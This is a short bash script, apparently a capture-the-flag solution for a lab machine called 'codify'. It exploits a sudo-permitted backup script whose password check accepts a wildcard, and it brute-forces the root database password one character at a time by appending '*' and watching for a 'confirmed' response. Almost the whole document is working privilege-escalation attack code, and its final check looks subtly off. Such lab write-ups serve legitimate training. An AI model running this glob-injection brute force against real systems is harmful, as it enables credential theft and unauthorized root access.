# sudo -l
#User joshua may run the following commands on codify:
#    (root) /opt/scripts/mysql-backup.sh
# mysql-backup.sh prompts for password and compares it to root db_pass, wildcard allows successful login so we brute force that

characters="$(printf '%s' {a..z} {A..Z} {0..9})"

ppass=""
unknown=true
while $unknown; do
        for ((i = 0; i < ${#characters}; i++)); do
            current_char="${characters:i:1}"
            confirmation=$(printf "%s" "$ppass$current_char*" | sudo /opt/scripts/mysql-backup.sh 2>&1 /dev/null)
            if echo "$confirmation" | grep confirmed ; then
                ppass="$ppass$current_char"
                echo $ppass
                if printf "%s" "$ppass$current_char" | sudo /opt/scripts/mysql-backup.sh | grep confirmed; then
                        echo "$ppass"
                        unknown=false
                fi
            fi
        done
done
